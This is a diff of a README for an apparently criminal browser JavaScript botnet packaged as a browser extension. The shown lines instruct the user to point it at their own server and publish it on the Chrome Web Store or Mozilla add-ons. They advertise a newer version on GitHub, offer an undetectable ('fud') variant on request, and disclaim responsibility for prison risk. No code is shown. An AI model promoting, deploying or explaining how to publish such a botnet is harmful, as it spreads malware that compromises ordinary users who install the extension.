@@ -38,16 +38,6 @@ change http://1127.0.0.1     to your web server
 4) publish your extension one chrome web store or adon mozilla
 
 waring !!!!!!!
-# New version Browser javascript Botent V 3
-https://github.com/hakanonymos/browser-javascript-botnet-v3
-
-# Contact me : 
-https://instagram.com/hakanonymos
-
-this is older version of javascript but new version php,if you need a fud version contact me
- I am in no way responsible for your actions, you risk going to prison
- 
- 
 # Version pro 
 
 ##################################################
@@ -61,5 +51,9 @@ Instagram : https://www.instagram.com/hakanonymos
 
 # demo video Youtub (update video )
 https://bit.ly/2x1yhd2
+
+# New version Browser javascript Botent V 3
+https://github.com/hakanonymos/browser-javascript-botnet-v3
+  
 
 
